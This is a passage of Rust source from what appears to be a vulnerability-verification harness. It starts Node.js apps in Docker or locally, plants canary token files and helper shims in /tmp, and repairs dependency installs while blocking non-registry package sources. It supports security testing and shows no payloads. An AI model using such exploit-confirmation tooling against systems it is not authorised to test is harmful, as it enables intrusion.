                .map(|out| out.trim() == "true")
                .unwrap_or(false),
            Runtime::Local { process, .. } if name == self.app => {
                let mut process = process.borrow_mut();
                let Some(child) = process.as_mut() else {
                    return false;
                };
                let group = child.id();
                child.try_wait().is_ok_and(|status| status.is_none())
                    || local_process_group_running(group)
            }
            Runtime::Local { .. } => false,
        }
    }

    fn tail_logs(&self, name: &str) -> String {
        match &self.runtime {
            Runtime::Docker => tail_logs(name),
            Runtime::Local { log, .. } if name == self.app => std::fs::read_to_string(log)
                .map(|text| tail(&text, 50))
                .unwrap_or_default(),
            Runtime::Local { marker_log, .. } if name == self.marker => {
                std::fs::read_to_string(marker_log)
                    .map(|text| tail(&text, 50))
                    .unwrap_or_default()
            }
            Runtime::Local { .. } => String::new(),
        }
    }

    /// Reads a local process's final log only after its descendants have had a short opportunity to
    /// flush their stack trace. Package-manager launchers can exit a few milliseconds before the
    /// Node child finishes writing the error; classifying the partial log misses safe startup
    /// retries that depend on stack frames and makes the same checkout timing-dependent under load.
    fn settled_tail_logs(&self, name: &str) -> String {
        if matches!(&self.runtime, Runtime::Local { .. }) {
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
        self.tail_logs(name)
    }

    /// Removes the app, the marker service, the network and the image. Safe to call twice.
    pub fn teardown(&mut self) {
        if self.torn_down {
            return;
        }
        self.torn_down = true;
        match &self.runtime {
            Runtime::Docker => {
                remove_container(&self.app);
                remove_container(&self.marker);
                if let Some(db) = &self.db {
                    remove_container(db);
                }
                if let Some(redis) = &self.redis {
                    remove_container(redis);
                }
                let _ = docker(&["network", "rm", &self.network]);
                let _ = docker(&["rmi", "-f", &self.tag]);
            }
            Runtime::Local {
                log,
                process,
                services,
                service_dirs,
                marker_log,
                created_files,
                ..
            } => {
                if let Some(mut child) = process.borrow_mut().take() {
                    stop_local_process(&mut child);
                }
                for mut child in services.borrow_mut().drain(..) {
                    let _ = child.kill();
                    let _ = child.wait();
                }
                let _ = std::fs::remove_file(log);
                let _ = std::fs::remove_file(marker_log);
                for path in created_files {
                    let _ = std::fs::remove_file(path);
                }
                for dir in service_dirs {
                    let _ = std::fs::remove_dir_all(dir);
                }
            }
        }
    }
}

impl Drop for Session {
    fn drop(&mut self) {
        self.teardown();
    }
}

fn stop_local_process(child: &mut Child) {
    #[cfg(unix)]
    {
        // `process_group(0)` makes the launcher pid the group id. A negative target tells `kill`
        // to signal the complete group, including the Node process npm/yarn spawned.
        let _ = Command::new("kill")
            .args(["-KILL", "--", &format!("-{}", child.id())])
            .output();
    }
    // Also kill the direct child for non-Unix hosts and as a backstop if the group signal failed.
    let _ = child.kill();
    let _ = child.wait();
}

#[cfg(unix)]
fn local_process_group_running(group: u32) -> bool {
    Command::new("kill")
        .args(["-0", "--", &format!("-{group}")])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok_and(|status| status.success())
}

#[cfg(not(unix))]
fn local_process_group_running(_group: u32) -> bool {
    false
}

fn prepare_local_app(
    _root: &std::path::Path,
    install_root: &std::path::Path,
) -> Result<(), String> {
    let package_manager = package_manager(install_root);
    let manifest_path = install_root.join("package.json");
    if !manifest_path.is_file() {
        return Ok(());
    }
    let original_manifest = if package_manager == PackageManager::Npm {
        prepare_standalone_npm_manifest(&manifest_path)?
    } else {
        None
    };
    let install_result = run_local_setup(install_root, install_command(package_manager));
    if let Some(original) = original_manifest {
        std::fs::write(&manifest_path, original)
            .map_err(|error| format!("restoring {}: {error}", manifest_path.display()))?;
    }
    install_result?;
    // A stale pnpm/yarn lockfile can report a successful install while omitting dependencies newly
    // declared in package.json. The missing-module launch shim would then turn frameworks such as
    // Express into inert proxies: the port opens, but no route can ever answer. Detect that state
    // from the direct runtime dependency directories and repair it with a script-free npm install.
    // This is a fallback only; a complete native package-manager install is left untouched.
    let missing = missing_runtime_dependencies(install_root);
    if !missing.is_empty() {
        let blocked = direct_dependencies_with_non_registry_transitives(install_root, &missing);
        let repairable = missing
            .iter()
            .filter(|name| !blocked.contains(name.as_str()))
            .cloned()
            .collect::<Vec<_>>();
        if !repairable.is_empty() {
            let repair = runtime_dependency_repair_command(&manifest_path, &repairable)?;
            let original_manifest = prepare_registry_only_npm_manifest(&manifest_path, &blocked)?;
            // `--package-lock=false` prevents writes but npm still reads an existing lockfile. A lock
            // can pin an otherwise ordinary transitive dependency to a prohibited remote tarball, so
            // keep it out of this registry-only fallback and restore it byte-for-byte afterwards.
            let original_locks = temporarily_remove_npm_lockfiles(install_root)?;
            let repair_result = run_local_setup(install_root, &repair);
            let manifest_restore = if let Some(original) = original_manifest {
                std::fs::write(&manifest_path, original)
                    .map_err(|error| format!("restoring {}: {error}", manifest_path.display()))
            } else {
                Ok(())
            };
            let lock_restore = restore_npm_lockfiles(original_locks);
            manifest_restore?;
            lock_restore?;
            repair_result?;
        }
    }
    if let Ok(manifest) = std::fs::read_to_string(&manifest_path)
        && let Some(script) = build_script(&manifest, install_root)
    {
        run_local_setup(install_root, &build_command(package_manager, script))?;
    }
    Ok(())
}

fn missing_runtime_dependencies(root: &std::path::Path) -> Vec<String> {
    let Ok(source) = std::fs::read(root.join("package.json")) else {
        return Vec::new();
    };
    let Ok(manifest) = serde_json::from_slice::<serde_json::Value>(&source) else {
        return Vec::new();
    };
    let Some(dependencies) = manifest
        .get("dependencies")
        .and_then(serde_json::Value::as_object)
    else {
        return Vec::new();
    };
    dependencies
        .iter()
        .filter(|(_, version)| version.as_str().is_some_and(registry_dependency_spec))
        .map(|(name, _)| name)
        .filter(|name| !root.join("node_modules").join(name.as_str()).exists())
        .cloned()
        .collect()
}

/// Direct registry dependencies whose pinned package metadata itself reaches outside the registry.
/// Hardened runners reject those transitives (`pkg@https://…`, Git URLs) even though the direct
/// dependency looks ordinary. Installing the entire missing set then rolls back every safe package.
/// Package-lock v2/v3 records each direct package's dependency map, so exclude only the direct
/// package proven to introduce the prohibited edge and let startup determine whether that optional
/// capability was actually needed by the vulnerable route.
fn direct_dependencies_with_non_registry_transitives(
    root: &std::path::Path,
    missing: &[String],
) -> std::collections::BTreeSet<String> {
    let Ok(source) = std::fs::read(root.join("package-lock.json")) else {
        return std::collections::BTreeSet::new();
    };
    let Ok(lock) = serde_json::from_slice::<serde_json::Value>(&source) else {
        return std::collections::BTreeSet::new();
    };
    let Some(packages) = lock.get("packages").and_then(serde_json::Value::as_object) else {
        return std::collections::BTreeSet::new();
    };
    missing
        .iter()
        .filter(|name| {
            let key = format!("node_modules/{name}");
            packages
                .get(&key)
                .and_then(|package| package.get("dependencies"))
                .and_then(serde_json::Value::as_object)
                .is_some_and(|dependencies| {
                    dependencies
                        .values()
                        .any(|version| !version.as_str().is_some_and(registry_dependency_spec))
                })
        })
        .cloned()
        .collect()
}

fn runtime_dependency_repair_command(
    manifest_path: &std::path::Path,
    missing: &[String],
) -> Result<String, String> {
    let source = std::fs::read(manifest_path)
        .map_err(|error| format!("reading {}: {error}", manifest_path.display()))?;
    let manifest: serde_json::Value = serde_json::from_slice(&source)
        .map_err(|error| format!("parsing {}: {error}", manifest_path.display()))?;
    let dependencies = manifest
        .get("dependencies")
        .and_then(serde_json::Value::as_object)
        .ok_or_else(|| "runtime dependency repair has no dependency map".to_owned())?;
    let packages = missing
        .iter()
        .map(|name| {
            let version = dependencies
                .get(name)
                .and_then(serde_json::Value::as_str)
                .filter(|version| registry_dependency_spec(version))
                .ok_or_else(|| {
                    format!("runtime dependency `{name}` is not registry-installable")
                })?;
            Ok(shell_quote(&format!("{name}@{version}")))
        })
        .collect::<Result<Vec<_>, String>>()?;
    let install = format!(
        "npm install --no-save --package-lock=false --workspaces=false --omit=dev --ignore-scripts --legacy-peer-deps --no-audit --no-fund -- {}",
        packages.join(" ")
    );
    Ok(format!(
        "{install} || (sleep 2; {install}) || (sleep 5; {install})"
    ))
}

fn registry_dependency_spec(version: &str) -> bool {
    (version.starts_with("npm:") || !version.contains('/'))
        && ![
            "git:",
            "git+",
            "github:",
            "gitlab:",
            "bitbucket:",
            "ssh:",
            "http:",
            "https:",
            "file:",
            "link:",
            "workspace:",
        ]
        .iter()
        .any(|prefix| version.starts_with(prefix))
}

fn prepare_registry_only_npm_manifest(
    manifest_path: &std::path::Path,
    excluded: &std::collections::BTreeSet<String>,
) -> Result<Option<Vec<u8>>, String> {
    let original = std::fs::read(manifest_path)
        .map_err(|error| format!("reading {}: {error}", manifest_path.display()))?;
    let mut manifest: serde_json::Value = serde_json::from_slice(&original)
        .map_err(|error| format!("parsing {}: {error}", manifest_path.display()))?;
    let mut changed = false;
    for section in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    ] {
        let Some(entries) = manifest
            .get_mut(section)
            .and_then(serde_json::Value::as_object_mut)
        else {
            continue;
        };
        let blocked = entries
            .iter()
            .filter(|(name, version)| {
                excluded.contains(name.as_str())
                    || !version.as_str().is_some_and(registry_dependency_spec)
            })
            .map(|(name, _)| name.clone())
            .collect::<Vec<_>>();
        changed |= !blocked.is_empty();
        for name in blocked {
            entries.remove(&name);
        }
    }
    if !changed {
        return Ok(None);
    }
    let patched = serde_json::to_vec_pretty(&manifest)
        .map_err(|error| format!("serializing {}: {error}", manifest_path.display()))?;
    std::fs::write(manifest_path, patched)
        .map_err(|error| format!("patching {}: {error}", manifest_path.display()))?;
    Ok(Some(original))
}

fn temporarily_remove_npm_lockfiles(
    root: &std::path::Path,
) -> Result<Vec<(std::path::PathBuf, Vec<u8>)>, String> {
    let mut originals = Vec::new();
    for name in ["package-lock.json", "npm-shrinkwrap.json"] {
        let path = root.join(name);
        if !path.is_file() {
            continue;
        }
        let contents =
            std::fs::read(&path).map_err(|error| format!("reading {}: {error}", path.display()))?;
        std::fs::remove_file(&path)
            .map_err(|error| format!("hiding {}: {error}", path.display()))?;
        originals.push((path, contents));
    }
    Ok(originals)
}

fn restore_npm_lockfiles(originals: Vec<(std::path::PathBuf, Vec<u8>)>) -> Result<(), String> {
    for (path, contents) in originals {
        std::fs::write(&path, contents)
            .map_err(|error| format!("restoring {}: {error}", path.display()))?;
    }
    Ok(())
}

/// npm cannot install a package extracted from a monorepo when its development-only sibling
/// dependencies use the `workspace:` protocol. The verifier only needs the package's registry
/// runtime dependencies, so temporarily remove those development entries for installation and
/// restore the checkout byte-for-byte afterwards. Yarn and pnpm understand the protocol natively.
fn prepare_standalone_npm_manifest(
    manifest_path: &std::path::Path,
) -> Result<Option<Vec<u8>>, String> {
    let original = std::fs::read(manifest_path)
        .map_err(|error| format!("reading {}: {error}", manifest_path.display()))?;
    let mut manifest: serde_json::Value = serde_json::from_slice(&original)
        .map_err(|error| format!("parsing {}: {error}", manifest_path.display()))?;
    let Some(dev_dependencies) = manifest
        .get_mut("devDependencies")
        .and_then(serde_json::Value::as_object_mut)
    else {
        return Ok(None);
    };
    let workspace_dependencies: Vec<String> = dev_dependencies
        .iter()
        .filter(|(_, value)| {
            value
                .as_str()
                .is_some_and(|version| version.starts_with("workspace:"))
        })
        .map(|(name, _)| name.clone())
        .collect();
    if workspace_dependencies.is_empty() {
        return Ok(None);
    }
    for name in workspace_dependencies {
        dev_dependencies.remove(&name);
    }
    let patched = serde_json::to_vec_pretty(&manifest)
        .map_err(|error| format!("serializing {}: {error}", manifest_path.display()))?;
    std::fs::write(manifest_path, patched)
        .map_err(|error| format!("patching {}: {error}", manifest_path.display()))?;
    Ok(Some(original))
}

fn run_local_setup(root: &std::path::Path, script: &str) -> Result<(), String> {
    let output = Command::new("sh")
        .args(["-c", script])
        .current_dir(root)
        .env("CI", "true")
        .env("COREPACK_ENABLE_DOWNLOAD_PROMPT", "0")
        .output()
        .map_err(|error| format!("running local setup `{script}`: {error}"))?;
    if output.status.success() {
        Ok(())
    } else {
        Err(format!(
            "local setup `{script}` failed:\n{}",
            tail(&String::from_utf8_lossy(&output.stderr), 50)
        ))
    }
}

fn acquire_local_fixture_lock() -> Result<File, String> {
    let path = std::env::temp_dir().join(LOCAL_FIXTURE_LOCK);
    let file = OpenOptions::new()
        .create(true)
        .truncate(false)
        .read(true)
        .write(true)
        .open(&path)
        .map_err(|error| format!("opening local verifier lock {}: {error}", path.display()))?;
    file.lock_exclusive().map_err(|error| {
        format!(
            "locking local verifier fixtures {}: {error}",
            path.display()
        )
    })?;
    Ok(file)
}

fn is_recognizable_local_fixture(path: &std::path::Path, expected: &[u8], existing: &[u8]) -> bool {
    if existing == expected {
        return true;
    }
    let Some(name) = path.file_name().and_then(|name| name.to_str()) else {
        return false;
    };
    if !name.starts_with("jss-canary-read") {
        return false;
    }
    serde_json::from_slice::<String>(existing).is_ok_and(|token| {
        (16..=128).contains(&token.len()) && token.bytes().all(|byte| byte.is_ascii_hexdigit())
    })
}

fn plant_local_files(canary: &Canary) -> Result<Vec<std::path::PathBuf>, String> {
    let mut files: Vec<(std::path::PathBuf, Vec<u8>)> = canary
        .planted_files()
        .into_iter()
        .map(|path| {
            (
                std::path::PathBuf::from(path),
                format!("\"{}\"", canary.token).into_bytes(),
            )
        })
        .collect();
    files.push((
        std::path::PathBuf::from(canary.planted_image_file()),
        payload::PLANTED_IMAGE_PNG.to_vec(),
    ));
    files.extend([
        (
            std::path::PathBuf::from("/tmp/jss-driver.js"),
            DRIVER_JS.as_bytes().to_vec(),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-marker.js"),
            MARKER_JS.as_bytes().to_vec(),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-launch-shim.js"),
            local_helper_source(LAUNCH_SHIM_JS),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-esm-hook.mjs"),
            LAUNCH_ESM_HOOK_JS.as_bytes().to_vec(),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-plugin-host.mjs"),
            local_helper_source(PLUGIN_HOST_JS),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-db-bootstrap.mjs"),
            DB_BOOTSTRAP_JS.as_bytes().to_vec(),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-express-host.mjs"),
            local_helper_source(EXPRESS_HOST_JS),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-lifecycle-host.mjs"),
            local_helper_source(LIFECYCLE_HOST_JS),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-route-host.mjs"),
            local_helper_source(ROUTE_HOST_JS),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-node-red-host.mjs"),
            local_helper_source(NODE_RED_HOST_JS),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-azure-func-host.cjs"),
            local_helper_source(AZURE_FUNC_HOST_JS),
        ),
        (
            std::path::PathBuf::from("/tmp/jss-worker-host.mjs"),
            local_helper_source(WORKER_HOST_JS),
        ),
    ]);
    let manifest = std::env::temp_dir().join(LOCAL_FIXTURE_MANIFEST);
    let allowed: std::collections::BTreeSet<&std::path::Path> =
        files.iter().map(|(path, _)| path.as_path()).collect();
    if manifest.exists() {
        let contents = std::fs::read(&manifest).map_err(|error| {
            format!(
                "reading local verifier ownership manifest {}: {error}",
                manifest.display()
            )
        })?;
        let previous =
            serde_json::from_slice::<Vec<std::path::PathBuf>>(&contents).map_err(|error| {
                format!(
                    "local verifier refuses to replace invalid ownership manifest {}: {error}",
                    manifest.display()
                )
            })?;
        for path in previous {
            if allowed.contains(path.as_path()) {
                let _ = std::fs::remove_file(path);
            }
        }
        std::fs::remove_file(&manifest).map_err(|error| {
            format!(
                "removing stale local verifier ownership manifest {}: {error}",
                manifest.display()
            )
        })?;
    }

    let mut created = Vec::new();
    for (path, contents) in files {
        if path.exists() {
            let existing = std::fs::read(&path).map_err(|error| {
                format!(
                    "reading existing local verifier fixture {}: {error}",
                    path.display()
                )
            })?;
            if is_recognizable_local_fixture(&path, &contents, &existing) {
                std::fs::remove_file(&path).map_err(|error| {
                    format!(
                        "removing stale local verifier fixture {}: {error}",
                        path.display()
                    )
                })?;
            } else {
                for written in &created {
                    let _ = std::fs::remove_file(written);
                }
                return Err(format!(
                    "local verifier refuses to overwrite existing `{}`",
                    path.display()
                ));
            }
        }
        if let Err(error) = std::fs::write(&path, contents) {
            for written in &created {
                let _ = std::fs::remove_file(written);
            }
            return Err(format!(
                "writing local verifier fixture {}: {error}",
                path.display()
            ));
        }
        created.push(path);
    }
    let encoded = serde_json::to_vec(&created)
        .map_err(|error| format!("encoding local verifier ownership manifest: {error}"))?;
    if let Err(error) = std::fs::write(&manifest, encoded) {
        for written in &created {
            let _ = std::fs::remove_file(written);
        }
        return Err(format!(
            "writing local verifier ownership manifest {}: {error}",
            manifest.display()
        ));
    }
    created.push(manifest);
    Ok(created)
}

/// Restore read-oracle fixtures removed by an application's startup cleanup between local launch
/// attempts. Only files this verifier created and now finds missing are recreated; an existing path
/// is never overwritten. This runs after the listener is ready and before the first probe.
fn restore_local_read_canaries(canary: &Canary) -> Result<(), String> {
    for path in canary.planted_files() {
        let path = std::path::PathBuf::from(path);
        if path.exists() {
            continue;
        }
        std::fs::write(&path, format!("\"{}\"", canary.token)).map_err(|error| {
            format!(
                "restoring local verifier fixture {}: {error}",
                path.display()
            )
        })?;
    }
    Ok(())
}

fn local_helper_source(source: &str) -> Vec<u8> {
    localize_helper_paths(source).into_bytes()
}

/// Translate image-root helper paths for the local runtime exactly once. Request specs also contain
/// already-localized canary payloads, so a plain textual replacement would corrupt
/// `/tmp/jss-canary-read` into `/tmp/tmp/jss-canary-read` on every `exec`.
fn localize_helper_paths(input: &str) -> String {
    let mut out = String::with_capacity(input.len() + 4);
    let mut rest = input;
    while let Some(at) = rest.find("/jss-") {
        out.push_str(&rest[..at]);
        let root_path = out.chars().next_back().is_none_or(|c| {
            c.is_whitespace() || matches!(c, '\'' | '"' | '=' | ':' | '(' | '[' | '{')
        });
        if root_path {
            out.push_str("/tmp/jss-");
        } else {
            out.push_str("/jss-");
        }
        rest = &rest[at + "/jss-".len()..];
    }
    out.push_str(rest);
    out.replace("/tmp/tmp/jss-", "/tmp/jss-")
}

fn local_sqlite_search_roots(app_root: &std::path::Path, base_env: &[RequiredEnv]) -> Vec<String> {
    let mut roots = vec![app_root.display().to_string()];
    roots.extend(
        base_env
            .iter()
            .filter(|item| item.directory)
            .map(|item| localize_helper_paths(&item.value)),
    );
    roots.push("/tmp/jss-ws".to_owned());
    roots
}

/// Builds the verify image: the repo copied in, dependencies installed, the marker file planted,
/// the driver and marker scripts added, and the app's start command set. The install step is the
/// only one with network access.
#[allow(clippy::too_many_arguments)]
fn build_image(
    root: &std::path::Path,
    app_root: &std::path::Path,
    install_root: &std::path::Path,
    install_workdir: &str,
    workdir: &str,
    tag: &str,
    canary: &Canary,
    start_command: &str,
    port: u16,
    build_env: &[(String, String)],
) -> Result<(), String> {
    let context = root
        .to_str()
        .ok_or_else(|| "the repository path is not valid UTF-8".to_owned())?;
    // Dependencies are declared and locked in the install directory (the nearest manifest ancestor
    // of the launch directory), so the package manager and base image are chosen from there. The
    // build script, by contrast, belongs to the app actually launched: a standalone server run from
    // a manifest-less subdirectory needs its ancestor's dependencies, not its ancestor's build.
    let image = base_image(install_root);
    let pm = package_manager(install_root);
    // The Azure and worker host shims load the application's own source directly, so the app's build
    // step (a webpack/wrangler bundle produced for the deployment host) is dead weight — and running
    // it needs dev-time tooling that may be absent or slow. Skip it when launching through one of them.
    let has_build = (!start_command.contains("/jss-azure-func-host")
        && !start_command.contains("/jss-worker-host"))
    .then(|| {
        std::fs::read_to_string(app_root.join("package.json"))
            .ok()
            .and_then(|manifest| build_script(&manifest, app_root))
    })
    .flatten();
    let native_build = needs_native_toolchain(install_root);
    let dockerfile = dockerfile(
        &image,
        install_workdir,
        workdir,
        canary,
        start_command,
        port,
        pm,
        has_build,
        native_build,
        build_env,
    );
    build_from_dockerfile(&dockerfile, tag, context)
}

/// The directory whose manifest and lockfile declare the dependencies to install for a launch
/// directory: the nearest ancestor of `app_path` (inclusive, relative to `root`) that holds a
/// `package.json`. A self-contained server launched from a directory with no manifest of its own
/// (`src/web/dashboard.js`) still has its dependencies declared by an ancestor package; installing
/// there — not in the manifest-less launch directory — is what makes `require('express')` resolve
/// at run time. Falls back to the launch directory when no ancestor manifest exists.
fn install_path(root: &std::path::Path, app_path: &std::path::Path) -> std::path::PathBuf {
    let mut dir = Some(app_path);
    while let Some(current) = dir {
        if root.join(current).join("package.json").is_file() {
            return current.to_path_buf();
        }
        dir = if current.as_os_str().is_empty() {
            None
        } else {
            Some(current.parent().unwrap_or_else(|| std::path::Path::new("")))
        };
    }
    app_path.to_path_buf()
}

/// Whether the app may load Node's built-in `node:sqlite` module, which only loads under the
/// `--experimental-sqlite` runtime flag. A cheap, bounded textual scan of the repository's
/// JavaScript/TypeScript sources for the `node:sqlite` specifier: a database helper the launched
/// entry `require`s often lives outside the launch directory, so the scan is repository-wide, and
/// the flag is a harmless no-op for an app that does not use the module. Skips `node_modules` and
/// dot-directories, and caps the number of files read so a large repository cannot stall startup.
fn uses_node_sqlite(root: &std::path::Path, _app_root: &std::path::Path) -> bool {
    fn scan(dir: &std::path::Path, budget: &mut u32) -> bool {
        let Ok(entries) = std::fs::read_dir(dir) else {
            return false;
        };
        for entry in entries.flatten() {
            if *budget == 0 {
                return false;
            }
            let path = entry.path();
            let name = entry.file_name();
            let name = name.to_string_lossy();
            if path.is_dir() {
                if name == "node_modules" || name.starts_with('.') {
                    continue;
                }
                if scan(&path, budget) {
                    return true;
                }
            } else if matches!(
                path.extension().and_then(|e| e.to_str()),
                Some("js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx")
            ) {
                *budget -= 1;
                if std::fs::read_to_string(&path).is_ok_and(|text| text.contains("node:sqlite")) {
                    return true;
                }
            }
        }
        false
    }
    let mut budget = 5000u32;
    scan(root, &mut budget)
}

/// Node's built-in modules, by the root segment that appears in an import specifier (`fs/promises`
/// -> `fs`). Specifiers naming these are never installed from a registry, so they are not weighed
/// when choosing a dependency provider.
const NODE_BUILTINS: [&str; 41] = [
    "assert",
    "async_hooks",
    "buffer",
    "child_process",
    "cluster",
    "console",
    "constants",
    "crypto",
    "dgram",
    "diagnostics_channel",
    "dns",
    "domain",
    "events",
    "fs",
    "http",
    "http2",
    "https",
    "inspector",
    "module",
    "net",
    "os",
    "path",
    "perf_hooks",
    "process",
    "punycode",
    "querystring",
    "readline",
    "repl",
    "stream",
    "string_decoder",
    "sys",
    "timers",
    "tls",
    "trace_events",
    "tty",
    "url",
    "util",
    "v8",
    "vm",
    "worker_threads",
    "zlib",
];

/// The quoted specifiers a JavaScript source imports through `require(...)`, `import(...)` or a
/// static `from '...'`. A deliberately simple textual scan: only enough to recognize which packages
/// a module pulls in. Specifiers that are not real imports (text inside a comment, say) are filtered
/// out later by intersecting with declared dependencies.
fn import_specifiers(src: &str) -> Vec<String> {
    const MARKERS: [&str; 3] = ["require(", "import(", "from"];
    let bytes = src.as_bytes();
    let mut out = Vec::new();
    for marker in MARKERS {
        let mut from = 0;
        while let Some(rel) = src[from..].find(marker) {
            let mut i = from + rel + marker.len();
            from = i;
            while bytes.get(i).is_some_and(u8::is_ascii_whitespace) {
                i += 1;
            }
            let Some(&quote) = bytes.get(i) else {
                continue;
            };
            if !matches!(quote, b'\'' | b'"' | b'`') {
                continue;
            }
            let start = i + 1;
            let Some(end) = src[start..].find(quote as char) else {
                continue;
            };
            let spec = &src[start..start + end];
            if !spec.is_empty() {
                out.push(spec.to_owned());
            }
        }
    }
    out
}

/// The package name a specifier resolves to: its first path segment, or the first two for a scoped
/// package (`@scope/name/sub` -> `@scope/name`).
fn package_root(spec: &str) -> String {
    if let Some(scoped) = spec.strip_prefix('@') {
        let mut parts = scoped.splitn(3, '/');
        let scope = parts.next().unwrap_or("");
        let name = parts.next().unwrap_or("");
        if scope.is_empty() || name.is_empty() {
            String::new()
        } else {
            format!("@{scope}/{name}")
        }
    } else {
        spec.split('/').next().unwrap_or("").to_owned()
    }
}

/// The registry package names a JavaScript source imports: bare specifiers only (not relative or
/// absolute paths, not `node:` or built-in modules), reduced to their package root.
fn bare_specifiers(src: &str) -> std::collections::BTreeSet<String> {
    let mut out = std::collections::BTreeSet::new();
    for spec in import_specifiers(src) {
        if spec.starts_with('.') || spec.starts_with('/') || spec.starts_with("node:") {
            continue;
        }
        let pkg = package_root(&spec);
        if pkg.is_empty() || NODE_BUILTINS.contains(&pkg.as_str()) {
            continue;
        }
        out.insert(pkg);
    }
    out
}

/// The registry package names a JavaScript source imports *at module load time*: like
/// [`bare_specifiers`], but only from statements at the module's top level (whose line is not
/// indented). A dependency `require`d lazily inside a function body (`function play(){ const app =
/// require('electron').app; … }`) runs only when that handler is invoked, never when the module is
/// merely loaded to publish its routes, so it is an optional/deferred dependency — a desktop-only or
/// platform-specific add-on the route under test does not need. Such a specifier must not force a
/// dependency provider to carry it: if it genuinely fails to resolve at run time the launch shim
/// stubs it, but requiring a provider to declare it would reject the one package that supplies the
/// module's real load-time dependencies, leaving the app unable to start at all. A module bundled
/// onto a single line (minified) keeps every specifier, which is safe — the set only ever widens the
/// provider's obligations, never narrows what actually loads.
fn load_time_bare_specifiers(src: &str) -> std::collections::BTreeSet<String> {
    let mut out = std::collections::BTreeSet::new();
    for line in src.lines() {
        // A nested (indented) statement is inside a function/block: a lazy require, not a load-time
        // import. Top-level `const x = require(...)` / `import … from '…'` start at column zero.
        if line.starts_with([' ', '\t']) {
            continue;
        }
        for spec in import_specifiers(line) {
            if spec.starts_with('.') || spec.starts_with('/') || spec.starts_with("node:") {
                continue;
            }
            let pkg = package_root(&spec);
            if pkg.is_empty() || NODE_BUILTINS.contains(&pkg.as_str()) {
                continue;
            }
            out.insert(pkg);
        }
    }
    out
}

/// Bare registry package names the source `require`s inside a `try` block — modules whose absence
/// the code is written to tolerate via its own `catch` (an optional native/platform bridge injected
/// only on-device). Reproducing an environment where such a module is missing means letting its
/// `require` throw so the app's own fallback runs, not substituting an inert stub whose truthy value
/// crashes that fallback (`path.join(getDataPath())` where the stub makes `getDataPath()` return a
/// function). A deliberately simple scan that skips string and comment text and tracks brace nesting
/// so it only counts a `require` that is lexically within a `try { … }` body. Relative/absolute,
/// `node:` and built-in specifiers are ignored, like [`bare_specifiers`].
fn guarded_bare_requires(src: &str) -> std::collections::BTreeSet<String> {
    let b = src.as_bytes();
    let n = b.len();
    let mut i = 0usize;
    // One flag per open brace: whether that `{` opened a `try` body. A `require` is guarded when any
    // enclosing brace is a try body.
    let mut stack: Vec<bool> = Vec::new();
    let mut last_word: &str = "";
    let mut out = std::collections::BTreeSet::new();
    let is_ident = |c: u8| c.is_ascii_alphanumeric() || c == b'_' || c == b'$';
    while i < n {
        let Some(&c) = b.get(i) else {
            break;
        };
        // Line comment.
        if c == b'/' && b.get(i + 1) == Some(&b'/') {
            i += 2;
            while b.get(i).is_some_and(|byte| *byte != b'\n') {
                i += 1;
            }
            continue;
        }
        // Block comment.
        if c == b'/' && b.get(i + 1) == Some(&b'*') {
            i += 2;
            while !(b.get(i) == Some(&b'*') && b.get(i + 1) == Some(&b'/')) && i + 1 < n {
                i += 1;
            }
            i = (i + 2).min(n);
            last_word = "";
            continue;
        }
        // String or template literal: skipped whole, so braces and `require` text inside never count.
        if c == b'\'' || c == b'"' || c == b'`' {
            i += 1;
            while i < n {
                if b.get(i) == Some(&b'\\') {
                    i += 2;
                    continue;
                }
                if b.get(i) == Some(&c) {
                    i += 1;
                    break;
                }
                i += 1;
            }
            last_word = "";
            continue;
        }
        if c == b'{' {
            stack.push(last_word == "try");
            last_word = "";
            i += 1;
            continue;
        }
        if c == b'}' {
            stack.pop();
            last_word = "";
            i += 1;
            continue;
        }
        if is_ident(c) {
            let start = i;
            while b.get(i).is_some_and(|byte| is_ident(*byte)) {
                i += 1;
            }
            let word = &src[start..i];
            if word == "require" && stack.iter().any(|&t| t) {
                // Parse `require ( "spec" )`, tolerating whitespace.
                let mut j = i;
                while b.get(j).is_some_and(|byte| byte.is_ascii_whitespace()) {
                    j += 1;
                }
                if b.get(j) == Some(&b'(') {
                    j += 1;
                    while b.get(j).is_some_and(|byte| byte.is_ascii_whitespace()) {
                        j += 1;
                    }
                    if let Some(&quote) = b.get(j)
                        && matches!(quote, b'\'' | b'"' | b'`')
                    {
                        j += 1;
                        let s = j;
                        while b.get(j).is_some_and(|byte| *byte != quote) {
                            j += 1;
                        }
                        let spec = &src[s..j];
                        if !spec.starts_with('.')
                            && !spec.starts_with('/')
                            && !spec.starts_with("node:")
                        {
                            let pkg = package_root(spec);
                            if !pkg.is_empty() && !NODE_BUILTINS.contains(&pkg.as_str()) {
                                out.insert(pkg);
                            }
                        }
                    }
                }
            }
            last_word = word;
            continue;
        }
        if !c.is_ascii_whitespace() {
            last_word = "";
        }
        i += 1;
    }
    out
}

/// Optional packages guarded by the finding module or any imported source the planner already
/// collected for its runtime gates. A platform bridge is commonly required in a utility imported by
/// the route rather than in the route itself; limiting this to the entry file makes the missing-module
/// shim turn that optional dependency into a truthy fake and disables the application's real fallback.
fn guarded_modules(
    root: &std::path::Path,
    entry_file: Option<&std::path::Path>,
    gating_sources: &[String],
) -> Vec<String> {
    let mut guarded = std::collections::BTreeSet::new();
    if let Some(src) = entry_file.and_then(|entry| std::fs::read_to_string(root.join(entry)).ok()) {
        guarded.extend(guarded_bare_requires(&src));
    }
    for src in gating_sources {
        guarded.extend(guarded_bare_requires(src));
    }
    guarded.into_iter().collect()
}

/// Every registry package name imported anywhere in a source subtree (bounded by [`app_source_files`]).
fn subtree_specifiers(dir: &std::path::Path) -> std::collections::BTreeSet<String> {
    let mut out = std::collections::BTreeSet::new();
    for src in app_source_files(dir) {
        out.extend(bare_specifiers(&src));
    }
    out
}

/// Every dependency a package manifest declares, across the runtime, development, optional and peer
/// sections — the names that will have a directory under its `node_modules` after an install.
